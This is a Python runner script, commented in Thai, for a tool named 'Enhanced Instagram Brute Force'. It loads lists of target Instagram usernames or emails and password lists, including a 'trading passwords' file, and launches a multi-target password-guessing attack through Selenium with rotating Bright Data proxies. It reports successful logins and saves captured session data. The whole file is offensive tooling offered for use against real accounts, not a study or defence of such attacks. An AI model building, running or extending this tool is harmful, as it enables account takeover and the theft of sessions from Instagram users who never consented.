#!/usr/bin/env python3
"""
🚀 Enhanced Instagram Brute Force Execution Script
รัน brute force attack ด้วย Selenium Browser API และ Bright Data proxy
"""

import sys
import json
from pathlib import Path
from enhanced_brute_force import EnhancedInstagramBruteForce, load_passwords

def print_banner():
    """แสดง banner ของโปรแกรม"""
    banner = """
╔══════════════════════════════════════════════════════════════╗
║                🔓 ENHANCED INSTAGRAM BRUTE FORCE 🔓           ║
║                  with Selenium Browser API                   ║
║                                                              ║
║  🌐 Bright Data Proxy Support                                ║
║  🎯 Multi-target Attack                                      ║
║  📦 Session Extraction                                       ║
║  🔄 Auto Proxy Rotation                                      ║
║  🚨 Discord Notifications                                    ║
╚══════════════════════════════════════════════════════════════╝
    """
    print(banner)

def load_targets(target_file: str) -> list:
    """โหลดรายการเป้าหมายจากไฟล์"""
    try:
        with open(target_file, 'r', encoding='utf-8') as f:
            targets = [line.strip() for line in f if line.strip()]
        print(f"🎯 Loaded {len(targets)} targets from {target_file}")
        return targets
    except Exception as e:
        print(f"❌ Error loading targets: {e}")
        return []

def interactive_setup():
    """ตั้งค่าแบบ interactive"""
    print("\n🔧 Interactive Setup")
    print("=" * 50)
    
    # Get targets
    print("\n1. Choose target input method:")
    print("   a) Single target (manual input)")
    print("   b) Multiple targets from file")
    print("   c) Use demo targets for testing")
    
    choice = input("Your choice (a/b/c): ").lower().strip()
    
    targets = []
    if choice == 'a':
        target = input("Enter target username/email: ").strip()
        if target:
            targets = [target]
    elif choice == 'b':
        target_file = input("Enter target file path: ").strip()
        if target_file and Path(target_file).exists():
            targets = load_targets(target_file)
    else:  # Demo targets
        targets = ["demo_user_123", "test_account", "sample_target"]
        print(f"🧪 Using demo targets: {targets}")
    
    if not targets:
        print("❌ No valid targets provided")
        return None, None
    
    # Get passwords
    print("\n2. Choose password input method:")
    print("   a) Use common passwords file")
    print("   b) Use ALX trading passwords")
    print("   c) Custom password file")
    print("   d) Demo passwords for testing")
    
    pass_choice = input("Your choice (a/b/c/d): ").lower().strip()
    
    passwords = []
    if pass_choice == 'a':
        passwords = load_passwords("common_passwords.txt")
    elif pass_choice == 'b':
        passwords = load_passwords("alx_trading_passwords.txt")
    elif pass_choice == 'c':
        pass_file = input("Enter password file path: ").strip()
        if pass_file and Path(pass_file).exists():
            passwords = load_passwords(pass_file)
    else:  # Demo passwords
        passwords = ["123456", "password", "admin", "test123", "demo123", "user123"]
        print(f"🧪 Using demo passwords: {len(passwords)} passwords")
    
    if not passwords:
        print("❌ No valid passwords provided")
        return None, None
    
    return targets, passwords

def main():
    """ฟังก์ชันหลัก"""
    print_banner()
    
    # Check if running with command line arguments
    if len(sys.argv) > 1:
        if sys.argv[1] == "demo":
            # Demo mode
            targets = ["demo_user_123", "test_account"]
            passwords = ["123456", "password", "admin", "test123"]
            print(f"🧪 Demo mode: {len(targets)} targets, {len(passwords)} passwords")
        elif sys.argv[1] == "test":
            # Test proxy connection only
            print("🧪 Testing proxy connections...")
            from test_bright_data_connection import test_all_connections
            test_all_connections()
            return
        else:
            print("Usage: python run_enhanced_brute.py [demo|test]")
            return
    else:
        # Interactive mode
        targets, passwords = interactive_setup()
        if not targets or not passwords:
            return
    
    print(f"\n🚀 Starting Enhanced Brute Force Attack")
    print(f"   Targets: {len(targets)}")
    print(f"   Passwords: {len(passwords)}")
    
    # Confirm before starting
    confirm = input("\nProceed with attack? (y/N): ").lower().strip()
    if confirm != 'y':
        print("❌ Attack cancelled")
        return
    
    # Initialize and run brute force
    brute_force = EnhancedInstagramBruteForce()
    
    try:
        print(f"\n{'='*60}")
        print(f"🎯 ATTACK STARTING...")
        print(f"{'='*60}")
        
        # Run the attack
        results = brute_force.brute_force_multiple(targets, passwords)
        
        # Summary
        total_success = sum(
            sum(1 for r in target_results if r['success']) 
            for target_results in results.values()
        )
        
        print(f"\n{'='*60}")
        print(f"🏁 ATTACK COMPLETED")
        print(f"{'='*60}")
        print(f"✅ Successful logins: {total_success}")
        print(f"📊 Total attempts: {sum(len(tr) for tr in results.values())}")
        print(f"🎯 Targets processed: {len(results)}")
        
        if total_success > 0:
            print(f"\n🏆 SUCCESS! Found {total_success} valid credential(s)")
            print(f"📁 Check 'output/' folder for session data")
        
    except KeyboardInterrupt:
        print(f"\n⏹️ Attack stopped by user")
    except Exception as e:
        print(f"\n❌ Error during attack: {e}")
        import traceback
        traceback.print_exc()
    finally:
        # Cleanup
        print(f"\n🧹 Cleaning up...")
        brute_force.cleanup()
        print(f"✅ Cleanup completed")


if __name__ == "__main__":
    main()
